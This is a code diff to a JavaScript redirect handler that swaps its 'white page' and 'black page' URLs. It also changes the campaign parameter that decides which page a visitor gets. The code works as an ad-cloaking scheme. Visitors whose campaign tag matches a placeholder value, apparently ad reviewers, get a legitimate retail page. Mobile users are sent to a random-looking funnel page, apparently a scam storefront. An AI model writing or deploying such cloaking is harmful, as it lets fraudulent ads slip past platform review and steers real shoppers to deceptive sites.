@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.johnlewis.com/john-lewis-jersey-organic-cotton-short-sleeve-vests-pack-of-2/p6037613";
-    const blackPageURL = "https://jahzuipqiksuasdkzw.myfunnelish.com/chelsea-boden-boots-1737635084899211";
+    const whitePageURL = "https://shopleksi.com/products/youve-yeed-your-last-haw-partner-round-neck-unisex-t-shirt-1";
+    const blackPageURL = "https://yorvardcntrlzs.myfunnelish.com/chelsea-boden-boots-1737635084899211-1737635118902954-1737635126522108";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -12,7 +12,7 @@ export default function handler(req, res) {
     const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
   
     // Redirection logic
-    if (utmCampaign === '__AID_NAME__') {
+    if (utmCampaign === '__yaso__') {
       // UTM campaign 'l1' takes priority for both desktop and mobile
       res.writeHead(302, { Location: whitePageURL });
     } else if (isMobileDevice) {
